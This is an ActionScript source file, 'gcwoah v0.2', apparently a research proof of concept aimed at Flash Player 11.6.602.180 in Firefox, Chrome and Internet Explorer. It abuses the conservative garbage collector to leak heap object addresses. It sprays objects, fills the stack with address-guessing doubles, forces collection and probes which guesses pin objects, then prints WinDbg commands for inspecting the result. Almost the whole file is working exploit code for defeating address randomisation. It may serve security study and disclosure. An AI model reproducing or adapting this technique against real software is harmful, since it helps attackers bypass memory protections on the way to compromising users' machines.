package
{
    import flash.display.Sprite;
    import flash.external.ExternalInterface;
    import flash.text.TextField;
    import flash.text.TextFieldAutoSize;
    import flash.net.LocalConnection;
    import flash.utils.*;
    import flash.system.Capabilities;

    public class GCW extends Sprite
    {
        public var strongs : Array;
        public var weaks : Dictionary;

        public var minAddr: Number = 0x01000000;
        public var baseAddr: Number = minAddr;
        public var maxAddr: Number =  0x60000000;
        public var sprayObjects: Number = 0x4000;
        public var objectOffset1: Number = 0x40;
        public var objectOffset2: Number = 0x58;
        public var scanDelta: Number = 0x10000;
        public var pagesPerTick: Number = 16;

        public function gcPlease() : void {
            // unsupported technique that seems to force garbage collection
            try {
                new LocalConnection().connect('foo');
            } catch (e:Error) {}
            try {
                new LocalConnection().connect('foo');
            } catch (e:Error) {}
        }

        public function loadWeak(count:Number, f:Function) : void {
            weaks = new Dictionary(true);
            strongs = new Array();

            while (count > 0) {
                var obj: Object = f(count);
                weaks[obj] = count;
                strongs.push(obj);
                count -= 1;
            }
        }

        public function packDouble(a:Number, b:Number): Number {
            var ba:ByteArray = new ByteArray();
            ba.endian = Endian.LITTLE_ENDIAN;
            ba.position = 0
            ba.writeUnsignedInt(a);
            ba.writeUnsignedInt(b);
            ba.position = 0;
            return ba.readDouble();
        }

        public function pageToDouble(page:Number, probe:Boolean = false): Number {
            if (probe)
                return packDouble(0, page + objectOffset2);
            return packDouble(page + objectOffset1, page + objectOffset2);
        }

        public function doubleToPage(a:Number): Number {
            var ba:ByteArray = new ByteArray();
            ba.endian = Endian.LITTLE_ENDIAN;
            ba.position = 0
            ba.writeDouble(a);
            ba.position = 0;
            return ba.readUnsignedInt() - objectOffset1;
        }

        public function poop(a:Number, b:Number, c:Number) : void {
            gcPlease();
            trace("Found it!");
        }

        public function annihilateStackHelper(
            a0:Number, a1:Number, a2:Number, a3:Number,
            a4:Number, a5:Number, a6:Number, a7:Number,
            b0:Number, b1:Number, b2:Number, b3:Number,
            b4:Number, b5:Number, b6:Number, b7:Number,
            c0:Number, c1:Number, c2:Number, c3:Number,
            c4:Number, c5:Number, c6:Number, c7:Number,
            r:Number
            ) : Number
        {
            var rv:Number = (a0 + a1 + a2 + a3 + a4 + a5 + a6 + a7);
            rv *= (b0 + b1 + b2 + b3 + b4 + b5 + b6 + b7);
            rv *= (c0 + c1 + c2 + c3 + c4 + c5 + c6 + c7);
            if (r > 0) {
                return rv * annihilateStackHelper(
                    a0, a1, a2, a3, a4, a5, a6, a7,
                    b0, b1, b2, b3, b4, b5, b6, b7,
                    c0, c1, c2, c3, c4, c5, c6, c7,
                    r - 1);
            } else {
                return rv;
            }
        }

        public function annihilateStack(): Number
        {
            return annihilateStackHelper(
                0, 0, 0, 0, 0, 0, 0, 0,
                0, 0, 0, 0, 0, 0, 0, 0,
                0, 0, 0, 0, 0, 0, 0, 0,
                4);
        }

        public function countKeys(d:Dictionary) : Number {
            var count : Number= 0;
            for (var key : Object in d) {
                count += 1;
            }
            return count;
        }

        public function isGone() : Number {
            strongs = new Array();
            gcPlease();
            gcPlease();
            logWriteLn("[+] is_gone(): " + countKeys(weaks).toString());
            for (var key : Object in weaks) {
                strongs.push(key);
            }
            return countKeys(weaks);
        }

        public function delveFinal(
                page_0:Number, 
                page_1:Number, 
                page_2:Number, 
                page_3:Number, 
                page_4:Number, 
                page_5:Number, 
                page_6:Number, 
                page_7:Number, 
                depth:Number,
                probe:Number) : Number {

            if (depth > 0) {
                var thisBase: Number = doubleToPage(page_0);
                thisBase += scanDelta * 8;
                return delveFinal(
                    pageToDouble(thisBase + scanDelta * 0, probe == 0),
                    pageToDouble(thisBase + scanDelta * 1, probe == 1),
                    pageToDouble(thisBase + scanDelta * 2, probe == 2),
                    pageToDouble(thisBase + scanDelta * 3, probe == 3),
                    pageToDouble(thisBase + scanDelta * 4, probe == 4),
                    pageToDouble(thisBase + scanDelta * 5, probe == 5),
                    pageToDouble(thisBase + scanDelta * 6, probe == 6),
                    pageToDouble(thisBase + scanDelta * 7, probe == 7),
                    depth - 1,
                    probe - 8);
            } else {
                return isGone();
            }
        }


        public function sanityPleaseHelper() : Number {
            strongs = new Array();

            var tries : Number = 8;
            while(tries > 0) {
                gcPlease();
                if (countKeys(weaks) != sprayObjects) {
                    break;
                }
                tries -= 1;
            }

            if (tries == 0) {
                logWriteLn("[+] INSANE!?");
                return 0;
            }

            logWriteLn("[+] Sanity still around...");
            return 1;
        }

        public function sanityPlease() : Number {
            loadWeak(sprayObjects, createSprayObject);
            annihilateStack();
            return sanityPleaseHelper();
        }


        public function delve(
                page_0:Number, 
                page_1:Number, 
                page_2:Number, 
                page_3:Number, 
                page_4:Number, 
                page_5:Number, 
                page_6:Number, 
                page_7:Number, 
                depth:Number) : Number {

            if (depth > 0) {
                var thisBase: Number = doubleToPage(page_0);
                thisBase += scanDelta * 8;
                return delve(
                    pageToDouble(thisBase + scanDelta * 0),
                    pageToDouble(thisBase + scanDelta * 1),
                    pageToDouble(thisBase + scanDelta * 2),
                    pageToDouble(thisBase + scanDelta * 3),
                    pageToDouble(thisBase + scanDelta * 4),
                    pageToDouble(thisBase + scanDelta * 5),
                    pageToDouble(thisBase + scanDelta * 6),
                    pageToDouble(thisBase + scanDelta * 7),
                    depth - 1);
            } else {
                //logWriteLn("[+] delve(): before: weaks count is " + countKeys(weaks).toString());

                strongs = new Array();

                var tries : Number = 8;
                while(tries > 0) {
                    gcPlease();
                    if (countKeys(weaks) != sprayObjects) {
                        break;
                    }
                    tries -= 1;
                }

                if (tries == 0) {
                    logWriteLn("[+] Failed to trigger GC... WTF!?");
                    return 0;
                }

                // Ugh, sometimes there are lingering pinned objects :( -- generational GC? other
                // conservative errors? Last ditch effort to clean things up before evaluating the
                // heuristic that determines if the pinned objects are due to our stack vs other
                // noise.
                gcPlease();

                var weakCount: Number = countKeys(weaks);
                //logWriteLn("[+] delve(): after: weaks count is " + countKeys(weaks).toString());
                if (weakCount != 0) {
                    logWriteLn("[+] delve(): after: weaks count is " + weakCount.toString());
                    //poop(packDouble(0x41414141, 0x41414141), a, b);

                    // Extract the pinned objects and pin it via strongs array 
                    // to avoid freeing after unwinding stack
                    for (var key : Object in weaks) {
                        strongs.push(key);
                    }
                }

                //logWriteLn("[+] delve(): after: weaks count is " + weakCount.toString());
                return weakCount;
            }
        }

        public var output : TextField;

        public function logWriteLn(s:String) : void
        {
            output.appendText(s + "\n");
            output.scrollV = output.numLines;
        }

        public function createSprayObject(idx:Number) : Object
        {
            var rv : Object = new Object();
            rv["woah"] = idx;
            return rv;
        }

        public function scanTick(): void
        {
            //if (sanityPlease() == 0) {
            //    logWriteLn("[-] I can't work under these conditions...");
            //    return;
            //}

            logWriteLn("[+] Scanning " + pagesPerTick.toString() + " GC pages starting at " + baseAddr.toString(16));
            //logWriteLn("[+] Loading the weak dictionary...");
            loadWeak(sprayObjects, createSprayObject);

            // This is so fiddly :/
            // The above call must leave some object visible on the stack so delve() spray stops
            // getting cleaned up after the first time.  Conservative GC is a mess.
            annihilateStack();


            //logWriteLn("[+] Filling stack for scan...");
            var res: Number =  delve(
                pageToDouble(baseAddr + scanDelta * 0),
                pageToDouble(baseAddr + scanDelta * 1),
                pageToDouble(baseAddr + scanDelta * 2),
                pageToDouble(baseAddr + scanDelta * 3),
                pageToDouble(baseAddr + scanDelta * 4),
                pageToDouble(baseAddr + scanDelta * 5),
                pageToDouble(baseAddr + scanDelta * 6),
                pageToDouble(baseAddr + scanDelta * 7),
                (pagesPerTick / 8) - 1);
            baseAddr += scanDelta * pagesPerTick;

            // DIRTY HACK: The first test below gets ride of some false positives.  Conserative GC must be noticably over marking? 
            if (baseAddr != (minAddr + scanDelta * pagesPerTick) && res > 1) {
                logWriteLn("[+] Successfully pinned object via stack value");
                baseAddr -= scanDelta * pagesPerTick;

                annihilateStack();
                gcPlease();

                var pinned: Number = delveFinal(
                        pageToDouble(baseAddr + scanDelta * 0),
                        pageToDouble(baseAddr + scanDelta * 1),
                        pageToDouble(baseAddr + scanDelta * 2),
                        pageToDouble(baseAddr + scanDelta * 3),
                        pageToDouble(baseAddr + scanDelta * 4),
                        pageToDouble(baseAddr + scanDelta * 5),
                        pageToDouble(baseAddr + scanDelta * 6),
                        pageToDouble(baseAddr + scanDelta * 7),
                        (pagesPerTick / 8) - 1,
                        -1);
                logWriteLn("[+] Pinned objects: " + pinned.toString());

                if (pinned == 0) {
                    logWriteLn("[+] False positive? Continuing scan...");
                    baseAddr += scanDelta * pagesPerTick;
                    setTimeout(scanTick, 10);
                    return;
                }

                var probe: Number = 0;
                while (probe < pagesPerTick) {
                    logWriteLn("[+] Probing page " + (baseAddr + scanDelta * probe).toString(16));

                    res = delveFinal(
                        pageToDouble(baseAddr + scanDelta * 0, probe == 0),
                        pageToDouble(baseAddr + scanDelta * 1, probe == 1),
                        pageToDouble(baseAddr + scanDelta * 2, probe == 2),
                        pageToDouble(baseAddr + scanDelta * 3, probe == 3),
                        pageToDouble(baseAddr + scanDelta * 4, probe == 4),
                        pageToDouble(baseAddr + scanDelta * 5, probe == 5),
                        pageToDouble(baseAddr + scanDelta * 6, probe == 6),
                        pageToDouble(baseAddr + scanDelta * 7, probe == 7),
                        (pagesPerTick / 8) - 1,
                        probe - 8);
                    logWriteLn("[+] Pinned objects: " + res.toString());

                    if (res == pinned - 1) {
                        logWriteLn("[+] Winning address is " + (baseAddr + scanDelta * probe + objectOffset2).toString(16));

                        for(var iobj: Object in strongs) {
                            strongs[iobj]["woah"] = "You've won this time...";
                        }

                        var config_ff_plugin : Object = new Object();
                        config_ff_plugin["m_atomsAndFlags"] = 0x10;
                        config_ff_plugin["atomOffset"] = 0x8;
                        config_ff_plugin["stringBufferOffset"] = 0x8;
                        config_ff_plugin["stringLengthOffset"] = 0x10;
                        config_ff_plugin["instruct"] = "";

                        var config: Object;

                        var playerType: String = Capabilities.playerType;
                        if (Capabilities.manufacturer == "Google Pepper") playerType = "Pepper";

                        var flashVersion: String = playerType + " " + Capabilities.version.split(" ", 2)[1];

                        logWriteLn("Manufacturer: " + Capabilities.manufacturer);
                        logWriteLn("Version: " + flashVersion);

                        if (flashVersion == "PlugIn 11,6,602,180") {
                            config = config_ff_plugin;
                            config["instruct"] = "Attach to second FlashPlayerPlugin_<version>.exe (must have NPSWF32_<version>.dll loaded)";
                        } else if (flashVersion == "Pepper 11,6,602,180") {
                            config = config_ff_plugin;
                            config["atomOffset"] = 0x20;
                            config["instruct"] = "Attach to Chrome process with pepflashplayer.dll loaded (you can use ProcessExplorer to find processes with that DLL loaded)";
                        } else if (flashVersion == "ActiveX 11,6,602,180") {
                            config = config_ff_plugin;
                            config["atomOffset"] = 0x18;
                            config["instruct"] = "Attach to iexplore.exe with Flash32_<version>.ocx loaded (you can use ProcessExplorer to find processes with that DLL loaded)";
                        } else {
                            logWriteLn("***** Unknown version -- assuming it matches PlugIn 11,6,602,180");
                            config = config_ff_plugin;
                        }

                        var addrString: String = (baseAddr + scanDelta * probe + objectOffset2).toString(16);
                        var winObjExpr: String =  "(poi(((poi(@$t1 + " + config["m_atomsAndFlags"].toString(16) + ") & 0xfffffff8) + " + config["atomOffset"].toString(16) + ")) & 0xfffffff8)";
                        var winAddressExpr: String = "poi(" + winObjExpr + " + " + config["stringBufferOffset"].toString(16) + ")";
                        var winLengthExpr: String = "poi(" + winObjExpr + " + " + config["stringLengthOffset"].toString(16) + ")";

                        logWriteLn(config["instruct"]);
                        logWriteLn("WinDbg:");
                        logWriteLn("r $t1 = " + addrString + "; db " + winAddressExpr + " L " + winLengthExpr);

                        return;
                    }

                    pinned = res;
                    probe += 1;
                }

                logWriteLn("[+] False positive? Continuing scan...");
                baseAddr += scanDelta * pagesPerTick;
                setTimeout(scanTick, 10);
                return;

            } else if (baseAddr > maxAddr) {
                logWriteLn("[-] Hit the top of the scan and failed to pin an object :(");
            } else {
                setTimeout(scanTick, 10);
            }
        }

        public function GCW() : void
        {
            output = new TextField();
            output.x = 20;
            output.y = 20;
            output.width = 450;
            output.height = 325;
            output.multiline = true;
            output.wordWrap = true;
            output.border = true;
            output.text = "gcwoah v0.2\n\n";
            addChild(output);

            logWriteLn("[+] Initializing...");

            gcPlease();


            sanityPlease();
            sanityPlease();
            sanityPlease();
            sanityPlease();
            sanityPlease();

            setTimeout(scanTick, 10);

        }
    }
}


//r $t1 = 6e80058; db poi((poi(((poi(@$t1 + 10) & 0xfffffff8) + c)) & 0xfffffff8) + 8) L poi((poi(((poi(@$t1 + 10) & 0xfffffff8) + c)) & 0xfffffff8) + 10)

//r $t1 = 6e80058; db poi((poi(((poi(@$t1 + 10) & 0xfffffff8) + 8)) & 0xfffffff8) + 8) L poi((poi(((poi(@$t1 + 10) & 0xfffffff8) + 8)) & 0xfffffff8) + 10)
